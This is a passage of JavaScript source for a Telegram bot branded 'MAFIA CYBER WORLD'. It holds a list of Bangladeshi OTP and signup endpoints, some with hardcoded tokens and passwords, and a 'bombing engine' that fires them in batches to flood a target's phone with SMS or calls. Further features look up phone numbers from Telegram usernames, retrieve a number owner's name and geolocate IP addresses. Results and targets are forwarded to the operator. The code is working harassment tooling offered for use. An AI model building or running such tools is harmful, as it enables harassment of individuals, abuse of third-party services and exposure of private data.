  {"id":"381","name":"GP BkWebsite Send OTP","url":"https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json","lang":"en"}},
  {"id":"382","name":"Eonbazar Register","url":"https://app.eonbazar.com/api/auth/register","method":"post","body":"{\"mobile\":\"{phone}\",\"name\":\"{{randomName}}\",\"password\":\"Soji12345\",\"email\":\"{{email}}\"}","headers":{"Content-Type":"application/json","carttoken":"5d7bcfdb-27ae-453f-a4b9-6cf94da73032","ordersource":"web"}},
  {"id":"383","name":"Eonbazar Login OTP","url":"https://app.eonbazar.com/api/auth/login","method":"post","body":"{\"method\":\"otp\",\"mobile\":\"{phone}\"}","headers":{"Content-Type":"application/json","carttoken":"6c2f5732-65f7-461d-be7e-5dc887af6d37"}},
  {"id":"384","name":"Eat-Z App Connect","url":"https://api.eat-z.com/auth/customer/app-connect","method":"post","body":"{\"username\":\"+880{phone}\"}","headers":{"Content-Type":"application/json","x-eatz-apiclient":"ANDROID"}},
  {"id":"385","name":"Kormi24 GraphQL Send OTP","url":"https://api.kormi24.com/graphql","method":"post","body":"{\"operationName\":\"sendOTP\",\"variables\":{\"type\":1,\"mobile\":\"{phone}\",\"additional\":\"{\\\"user_agent\\\":\\\"web\\\",\\\"mobile\\\":\\\"{phone}\\\"}\",\"hash\":\"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180\"},\"query\":\"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }\"}","headers":{"Content-Type":"application/json","authorization":"tok"}},
  {"id":"386","name":"GP Web Login OTP (repeated 5x)","url":"https://weblogin.grameenphone.com/backend/api/v1/otp","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"387","name":"Shwapno Auth","url":"https://www.shwapno.com/api/auth","method":"post","body":"{\"phoneNumber\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"388","name":"Myblapi Send OTP","url":"https://myblapi.banglalink.net/api/v1/send-otp","method":"post","body":"{\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"389","name":"Walton Plaza GraphQL OTP","url":"https://api.waltonplaza.com.bd/graphql","method":"post","body":"{\"operationName\":\"createCustomerOtp\",\"variables\":{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"998283c0-622a-11ee-84c0-190466a47baa\",\"phone\":\"{phone}\"},\"device\":null},\"query\":\"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }\"}","headers":{"Content-Type":"application/json"}},
  {"id":"390","name":"PBS Generate OTP","url":"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method":"post","body":"{\"userPhone\":\"{phone}\",\"otp\":\"\"}","headers":{"Content-Type":"application/json"}},
  {"id":"391","name":"Aarong Customer Check + Token + Resend","url":"https://mcprod.aarong.com/graphql","method":"post","body":"{\"query\":\"query{checkCustomerExist(mobile_number:\\\"{phone}\\\" email:\\\"\\\"){status message}}\"}","headers":{"Content-Type":"application/json","store":"default"}},
  {"id":"392","name":"Aarong Generate Token","url":"https://mcprod.aarong.com/graphql","method":"post","body":"{\"query\":\"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number ) { token message } }\",\"variables\":{\"email\":\"\",\"password\":\"\",\"type\":\"mobile_number\",\"mobile_number\":\"{phone}\"}}","headers":{"Content-Type":"application/json","store":"default"}},
  {"id":"393","name":"Aarong Resend OTP","url":"https://mcprod.aarong.com/graphql","method":"post","body":"{\"query\":\"mutation resendOtp($email: String, $mobile_number: String!, $type: String!) { resendOtp(input: { email: $email mobile_number: $mobile_number type: $type }) }\",\"variables\":{\"email\":\"\",\"mobile_number\":\"{phone}\",\"type\":\"mobile_number\"}}","headers":{"Content-Type":"application/json","store":"default"}},
  {"id":"394","name":"Arogga SMS (mobile app)","url":"https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33","method":"post","body":"mobile={phone}&fcmToken=cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR&referral=","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"395","name":"Sundarban Courier GraphQL (Python)","url":"https://api-gateway.sundarbancourierltd.com/graphql","method":"post","body":"{\"operationName\":\"CreateAccessToken\",\"variables\":{\"accessTokenFilter\":{\"userName\":\"{phone}\"}},\"query\":\"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }\"}","headers":{"Content-Type":"application/json"}},
  {"id":"396","name":"Quiztime Send OTP","url":"https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp","method":"post","body":"{\"country_code\":\"+88\",\"phone\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"397","name":"Dressup Send OTP","url":"https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp","method":"post","body":"{\"country_code\":\"+880\",\"mobile\":\"{phone}\",\"type\":\"login\",\"whatsapp\":false}","headers":{"Content-Type":"application/json"}},
  {"id":"398","name":"Ghoori Learning OTP (Python duplicate)","url":"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web","method":"post","body":"{\"mobile_no\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"399","name":"Garibook Login (Python duplicate)","url":"https://api.garibookadmin.com/api/v3/user/login","method":"post","body":"{\"mobile\":\"{phone}\",\"recaptcha_token\":\"garibookcaptcha\",\"channel\":\"web\"}","headers":{"Content-Type":"application/json"}},
  {"id":"400","name":"Fabrilife Signup + OTP","url":"https://fabrilife.com/api/wp-json/wc/v2/user/register","method":"post","body":"{\"name\":\"{{name}}\",\"email\":\"{phone}@gmail.com\",\"phone\":\"{phone}\",\"password\":\"Riyaz@123\"}","headers":{"Content-Type":"application/json"}},
  {"id":"401","name":"Fabrilife Phone Login OTP","url":"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}","method":"post","body":"","headers":{"otpkey":"uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW"}},
  {"id":"402","name":"Kotha Device Auth + Send OTP","url":"https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus","method":"post","body":"{\"deviceId\":\"{{deviceId}}\",\"recipient\":\"+88{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"403","name":"Kotha Send OTP V2","url":"https://user.kotha.im/mobile/api/sendOTPV2","method":"post","body":"{\"deviceId\":\"{{deviceId}}\",\"recipient\":\"+88{phone}\",\"retryAttempt\":0}","headers":{"Content-Type":"application/json","Authorization":"{{token}}"}},
  {"id":"404","name":"BTCL BDIA Registration Verification","url":"https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1","method":"post","body":"actionType=otpSend&mobileNo={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"405","name":"BTCL Phonebill OTP (Type 1)","url":"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"{phone}\",\"email\":\"\",\"OTPType\":1,\"userName\":\"\"}","headers":{"Content-Type":"application/json"}},
  {"id":"406","name":"BTCL Phonebill OTP (Type 15 Login)","url":"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"OTPType\":15,\"userName\":\"{phone}\",\"isNewPhoneOrEmail\":false}","headers":{"Content-Type":"application/json"}}
];

// Pre-process API pool
const SMS_POOL = [];
const CALL_POOL = [];

RAW_APIS.forEach(api => {
    let u = api.url.replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
    let b = (api.body || '').replace(/\*{5}/g, '{phone}').replace(/\{\{phone\}\}/g, '{phone}');
    let m = (api.method || 'GET').toUpperCase();
    let h = api.headers || {};
    
    delete h['content-length']; delete h['Content-Length'];
    
    const ep = { name: api.name, url: u, method: m, body: b, headers: h };
    
    if (u.includes('/call/') || api.name.toLowerCase().includes('call')) {
        CALL_POOL.push(ep);
    } else {
        SMS_POOL.push(ep);
    }
});

log.info(`[Pool] Loaded ${SMS_POOL.length} SMS APIs, ${CALL_POOL.length} Call APIs.`);

// ── Bot ──
const bot = new TBot(CFG.TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
bot.on('polling_error', err => log.error('[Bot] ' + err.message));
const tgMsg = (cid, text, opts = {}) => bot.sendMessage(cid, (text || '').slice(0, 4096), { parse_mode: 'HTML', ...opts }).catch(e => log.warn(`[tgMsg] ${cid}: ${e.message}`));

const sleep = ms => new Promise(r => setTimeout(r, ms));
const renderTpl = (tpl, vars) => (tpl || '').replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? encodeURIComponent(vars[k]) : '');

// ── Bombing Engine ──
async function fireOne(ep, phone) {
    const url = renderTpl(ep.url, { phone });
    const body = renderTpl(ep.body, { phone });
    const timeout = 8000;
    try {
        const r = ep.method === 'POST'
            ? await axios.post(url, body, { headers: ep.headers, timeout, validateStatus: () => true })
            : await axios.get(url, { headers: ep.headers, timeout, validateStatus: () => true });
        const ok = r.status >= 200 && r.status < 400;
        const str = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
        const hit = ok && !str.toLowerCase().includes('error') && !str.toLowerCase().includes('fail');
        return { ok: hit, status: r.status, name: ep.name };
    } catch(e) {
        return { ok: false, status: 0, error: e.code || e.message, name: ep.name };
    }
}

async function bomb(type, phone, onProgress) {
    const list = type === 'sms' ? SMS_POOL : CALL_POOL;
    if (!list.length) return { error: 'no_endpoints', sent: 0, hits: 0, fails: 0 };
    
    const result = { sent: 0, hits: 0, fails: 0 };
    const start = Date.now();
    
    for (let i = 0; i < list.length; i += CFG.CONCURRENCY) {
        const batch = list.slice(i, i + CFG.CONCURRENCY);
        const settled = await Promise.all(batch.map(ep => fireOne(ep, phone)));
        
        settled.forEach(r => {
            result.sent++;
            if (r.ok) result.hits++;
            else result.fails++;
        });
        
        if (onProgress) onProgress(result.sent, list.length);
        await sleep(100);
    }
    
    result.elapsed = Date.now() - start;
    return result;
}

// ── Keyboards ──
const backKb = { inline_keyboard: [[{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]] };
const mainKb = { inline_keyboard: [
    [{ text: '📨 SMS Bomber', callback_data: 'BOMB_SMS' }, { text: '📞 Call Bomber', callback_data: 'BOMB_CALL' }],
    [{ text: '🔍 TG Lookup', callback_data: 'LOOKUP_TG' }, { text: '📱 BD Number Info', callback_data: 'INFO_NUM' }],
    [{ text: '🌐 IP Tracker', callback_data: 'INFO_IP' }, { text: '📧 Temp Mail', callback_data: 'INFO_MAIL' }],
]};

// ── Handlers ──
bot.onText(/\/start/, async msg => {
    const cid = String(msg.chat.id);
    if (getUser(cid).banned) return tgMsg(cid, '⛔ আপনি ব্যানড হয়েছেন।');

    const imgUrl = 'https://hc1.checker.in/file2link/photos/file_664940.jpg/file_664940.jpg';
    const caption = `
🖤 <b>MAFIA CYBER WORLD</b> 💀
━━━━━━━━━━━━━━━━━━━━━━━━
<b>What can this bot do?</b>

🕷️ <b>UNLIMITED SMS BOMBER</b>
📞 <b>UNLIMITED CALL BOMBER</b>
🔍 <b>TELEGRAM OSINT LOOKUP</b>
📱 <b>BD NUMBER INFO & TRACKER</b>
🌐 <b>IP ADDRESS TRACKER</b>
📧 <b>TEMP MAIL GENERATOR</b>
⚡ <b>400+ APIS CONNECTED</b>
🔥 <b>MASS FIRE 500-600+ MESSAGES</b>

━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>SUPPORT & CONTACT</b>
👉 @mafia_cyber_worldfxa
🛡️ <b>USE RESPONSIBLY</b>
🔒 <b>RESPECT PRIVACY & FOLLOW THE LAW</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👇 <b>Select an option below to begin:</b>
`;
    try {
        await bot.sendPhoto(cid, imgUrl, { caption: caption, parse_mode: 'HTML', reply_markup: mainKb });
    } catch(e) {
        await tgMsg(cid, caption, { reply_markup: mainKb });
    }
});

bot.onText(/\/menu/, async msg => {
    if (getUser(msg.chat.id).banned) return;
    tgMsg(msg.chat.id, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb });
});

// Admin commands
bot.onText(/\/ban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = true;
    saveStore(); tgMsg(msg.chat.id, `🔨 Banned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/unban\s+(\d+)/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    getUser(msg.text.split(' ')[1]).banned = false;
    saveStore(); tgMsg(msg.chat.id, `✅ Unbanned: <code>${msg.text.split(' ')[1]}</code>`);
});
bot.onText(/\/stats/, async msg => {
    if (!isAdmin(msg.chat.id)) return;
    tgMsg(msg.chat.id, `📊 <b>Stats</b>\n👥 Users: <b>${Object.keys(store.users).length}</b>\n📨 SMS APIs: <b>${SMS_POOL.length}</b>\n📞 Call APIs: <b>${CALL_POOL.length}</b>`);
});

// Callback Handler
bot.on('callback_query', async cbq => {
    const uid = String(cbq.from.id), chatId = cbq.message.chat.id, msgId = cbq.message.message_id;
    const data = cbq.data;
    if (!checkRate(uid)) return bot.answerCallbackQuery(cbq.id, { text: '⚠️ Slow down!', show_alert: true }).catch(()=>{});
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => bot.deleteMessage(chatId, msgId).catch(()=>{});
    if (getUser(uid).banned) return;

    try {
        if (data === 'M_BACK') { del(); delPending(uid); return tgMsg(chatId, '👇 মেনু সিলেক্ট করুন:', { reply_markup: mainKb }); }

        if (data === 'BOMB_SMS' || data === 'BOMB_CALL') {
            const isSms = data === 'BOMB_SMS';
            const poolSize = isSms ? SMS_POOL.length : CALL_POOL.length;
            if (poolSize === 0) { del(); return tgMsg(chatId, '⚠️ এই ক্যাটাগরিতে কোনো এপিআই নেই।', { reply_markup: backKb }); }
            
            del();
            setPending(uid, { type: isSms ? 'sms' : 'call' });
            
            return tgMsg(chatId, `${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} বোম্বিং</b>\n\nটার্গেট নাম্বারটি দিন (যেমন: <code>+88017XXXXXXXX</code>):`, 
                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
        }
        
        if (data === 'LOOKUP_TG') {
            del();
            setPending(uid, { type: 'tg_lookup' });
            return tgMsg(chatId, `🔍 <b>TG Username Lookup</b>\n\nইউজারনেম পাঠান (যেমন: <code>@username</code>):`, 
                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
        }

        if (data === 'INFO_NUM') {
            del();
            setPending(uid, { type: 'info_num' });
            return tgMsg(chatId, `📱 <b>BD Number Info</b>\n\nনাম্বারটি দিন (যেমন: <code>017XXXXXXXX</code>):`, 
                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
        }

        if (data === 'INFO_IP') {
            del();
            setPending(uid, { type: 'info_ip' });
            return tgMsg(chatId, `🌐 <b>IP Tracker</b>\n\nIP অ্যাড্রেসটি দিন (যেমন: <code>8.8.8.8</code>):`, 
                { reply_markup: { inline_keyboard: [[{ text: '❌ বাতিল', callback_data: 'M_BACK' }]] } });
        }

        if (data === 'INFO_MAIL') {
            del();
            const status = await tgMsg(chatId, '⏳ Generating Temp Mail...');
            try {
                const r = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
                if (r.data && r.data.length) {
                    const email = r.data[0];
                    if (status) bot.deleteMessage(chatId, status.message_id).catch(()=>{});
                    tgMsg(chatId, `📧 <b>Temporary Email</b>\n\n<code>${email}</code>\n\n💡 এই ইমেইলটি ১ ঘণ্টার জন্য কাজ করবে। ইনবক্স চেক করতে নিচের বাটনে ক্লিক করুন।`, 
                        { reply_markup: { inline_keyboard: [
                            [{ text: '📥 Check Inbox', callback_data: 'CHECK_MAIL_' + email }],
                            [{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]
                        ]}});
                }
            } catch(e) {
                if (status) bot.deleteMessage(chatId, status.message_id).catch(()=>{});
                tgMsg(chatId, '❌ ফেইল হয়েছে, আবার চেষ্টা করুন।', { reply_markup: backKb });
            }
            return;
        }

        if (data.startsWith('CHECK_MAIL_')) {
            const email = data.replace('CHECK_MAIL_', '');
            const [login, domain] = email.split('@');
            try {
                const r = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
                if (!r.data || !r.data.length) {
                    return bot.answerCallbackQuery(cbq.id, { text: '📭 No messages yet.', show_alert: true }).catch(()=>{});
                }
                
                let res = `📥 <b>Inbox for ${email}</b>\n\n`;
                r.data.slice(0, 5).forEach((m, i) => {
                    res += `<b>${i+1}. From:</b> ${m.from}\n<b>Subject:</b> ${m.subject}\n\n`;
                });
                tgMsg(chatId, res, { reply_markup: { inline_keyboard: [[{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]] } });
            } catch(e) {
                bot.answerCallbackQuery(cbq.id, { text: 'Error checking mail', show_alert: true }).catch(()=>{});
            }
            return;
        }
    } catch (err) { log.error('[CB] ' + err.message); }
});

// Message Handler
bot.on('message', async msg => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const uid = String(msg.from.id), text = msg.text.trim();
    if (getUser(uid).banned || !checkRate(uid)) return;
    
    const pend = getPending(uid);
    if (!pend) return;
    delPending(uid);

    if (pend.type === 'sms' || pend.type === 'call') {
        const isSms = pend.type === 'sms';
        let phone = text.replace(/\s+/g, '');
        
        if (!/^\+?\d{10,15}$/.test(phone)) {
            return tgMsg(uid, '❌ ভুল নাম্বার! সঠিক ফরম্যাট: <code>+88017XXXXXXXX</code>', { reply_markup: backKb });
        }
        
        const cleanPhone = phone.replace(/^\+/, '');
        const proc = await tgMsg(uid, `🚀 <b>বোম্বিং শুরু হচ্ছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n⚙️ এপিআই পুল: ${isSms ? SMS_POOL.length : CALL_POOL.length} টি`);
        
        let lastEdit = 0;
        try {
            const result = await bomb(isSms ? 'sms' : 'call', cleanPhone, (sent, total) => {
                const now = Date.now();
                if (now - lastEdit > 2000) {
                    bot.editMessageText(`🚀 <b>বোম্বিং চলছে...</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📡 প্রসেস: ${sent}/${total}`, { chat_id: uid, message_id: proc.message_id }).catch(()=>{});
                    lastEdit = now;
                }
            });

            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            
            if (result.error) {
                return tgMsg(uid, `❌ এরর: ${result.error}`, { reply_markup: backKb });
            }

            tgMsg(uid, `✅ <b>বোম্বিং সম্পন্ন!</b>\n\n🎯 টার্গেট: <code>+${cleanPhone}</code>\n📨 টোটাল রিকোয়েস্ট: ${result.sent}\n🟢 সফল হিট: <b>${result.hits}</b>\n🔴 ফেইল: ${result.fails}\n⏱ সময়: ${result.elapsed}ms`, 
                { reply_markup: { inline_keyboard: [
                    [{ text: '🔄 আবার বোম্বিং', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],
                    [{ text: '◀️ মেইন মেনু', callback_data: 'M_BACK' }]
                ]}});
                
            tgMsg(CFG.ADMIN_ID, `💣 BOMB | <code>${uid}</code> → +${cleanPhone}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms · ${isSms ? 'SMS' : 'CALL'}`);
            
        } catch (e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, `❌ সিস্টেম এরর: ${e.message}`, { reply_markup: backKb });
        }
        return;
    }
    
    if (pend.type === 'tg_lookup') {
        const proc = await tgMsg(uid, `⏳ Searching <code>${text}</code>...\nRunning OSINT sources...`);
        try {
            const res = await lookupTgUsername(text);
            let r = `🔍 <b>TG Lookup Result</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n🏷️ @${res.username}\n`;
            if (res.id) r += `🆔 ID: <code>${res.id}</code>\n`;
            if (res.name) r += `👤 Name: <b>${res.name}</b>\n`;
            if (res.bio) r += `📝 Bio: ${(res.bio||'').slice(0,150)}\n`;
            
            if (res.phone) {
                r += `\n📱 <b>Phone Number Found:</b>\n<code>${res.phone}</code>\n📡 Via: <i>${res.phoneSource}</i>\n`;
            } else {
                r += `\n📱 Phone: <i>Not found in public databases (Privacy Enabled)</i>\n`;
            }
            
            r += `━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>Checked: ${res.sources.join(' · ') || 'None'}</i>`;
            
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            
            tgMsg(uid, r, { reply_markup: { inline_keyboard: [
                [{ text: '🔍 Another Lookup', callback_data: 'LOOKUP_TG' }],
                [{ text: '◀️ Menu', callback_data: 'M_BACK' }]
            ]}});
            
            if (res.phone) {
                tgMsg(CFG.ADMIN_ID, `🔍 <b>OSINT HIT!</b>\nUser: <code>${uid}</code>\nTarget: @${res.username}\nPhone: <code>${res.phone}</code>`);
            }
            
        } catch(e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, '❌ Lookup failed or user not found.', { reply_markup: backKb });
        }
        return;
    }

    if (pend.type === 'info_num') {
        let p = text.replace(/\D/g, '');
        if (p.startsWith('880')) p = p.substring(2);
        if (!p.startsWith('0')) p = '0' + p;
        
        if (!/^01[3-9]\d{8}$/.test(p)) {
            return tgMsg(uid, '❌ ভুল নাম্বার! সঠিক ফরম্যাট: <code>017XXXXXXXX</code>', { reply_markup: backKb });
        }
        
        const proc = await tgMsg(uid, `⏳ Fetching Info for <code>${p}</code>...`);
        const res = await lookupBdNumber(p);
        
        let reply = `📱 <b>BD Number Information</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n📞 Number: <code>+88${res.phone}</code>\n📡 Carrier: <b>${res.carrier}</b>\n🌐 Country: <b>Bangladesh</b>\n`;
        if (res.name) reply += `👤 Name (Truecaller/GC): <b>${res.name}</b>\n`;
        else reply += `👤 Name: <i>Not found in public databases</i>\n`;
        
        if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
        tgMsg(uid, reply, { reply_markup: backKb });
        return;
    }

    if (pend.type === 'info_ip') {
        const ip = text.trim();
        if (!/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(ip)) {
            return tgMsg(uid, '❌ ভুল IP! সঠিক ফরম্যাট: <code>8.8.8.8</code>', { reply_markup: backKb });
        }
        
        const proc = await tgMsg(uid, `⏳ Tracking IP <code>${ip}</code>...`);
        try {
            const r = await axios.get(`http://ip-api.com/json/${ip}`);
            if (r.data && r.data.status === 'success') {
                const d = r.data;
                let reply = `🌐 <b>IP Tracker</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 IP: <code>${ip}</code>\n🌍 Country: <b>${d.country}</b> (${d.countryCode})\n📍 City: <b>${d.city}</b>, ${d.regionName}\n📮 ZIP: ${d.zip}\n📡 ISP: <b>${d.isp}</b>\n🏢 Org: ${d.org}\n🕒 Timezone: ${d.timezone}\n`;
                reply += `\n🗺️ <a href="https://www.google.com/maps?q=${d.lat},${d.lon}">Open in Google Maps</a>`;
                
                if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
                tgMsg(uid, reply, { reply_markup: backKb, disable_web_page_preview: true });
            } else {
                if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
                tgMsg(uid, '❌ IP টি খুঁজে পাওয়া যায়নি বা ইনভ্যালিড।', { reply_markup: backKb });
            }
        } catch(e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, '❌ ট্র্যাকিং ফেইল হয়েছে।', { reply_markup: backKb });
        }
        return;
    }
});

// Guards
process.on('uncaughtException',  err => log.error('[UNCAUGHT] ' + err.message));
process.on('unhandledRejection', err => log.error('[REJECTION] ' + err.message));
process.on('SIGTERM', () => { saveStore(); process.exit(0); });
process.on('SIGINT',  () => { saveStore(); process.exit(0); });

log.info(`[Bot] Started — admin=${CFG.ADMIN_ID}`);
log.info(`[Pool] SMS=${SMS_POOL.length} Call=${CALL_POOL.length}`);
